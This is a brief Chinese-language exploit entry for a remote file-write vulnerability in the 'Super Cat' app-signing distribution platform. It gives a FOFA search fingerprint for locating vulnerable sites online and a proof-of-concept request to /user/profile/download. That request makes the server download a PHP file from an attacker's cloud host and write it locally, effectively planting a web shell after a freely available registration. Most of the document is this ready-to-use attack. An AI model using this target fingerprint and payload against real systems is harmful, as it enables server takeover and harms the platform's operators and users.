# 超级猫签名APP分发平台前台远程文件写入漏洞

超级猫超级签名分发平台是一个安卓苹果APP分发平台，能够对所有安卓苹果的APP进行签名分发，使所有自行开发的APP能够签名使用，包括登录注册等功能，还提供有SDK

## fofa

```java
"/themes/97013266/public/static/css/pc.css"
```

## poc

**注意这里需要先登录，这处可以直接注册的**

![image-20240727120206313](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407271202404.png)

```java
/user/profile/download?url=http://云服务器地址/111.php&path=1
```

![image-20240727120241835](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407271202922.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/xTcnm_fFubFCYw4LhIXwkQ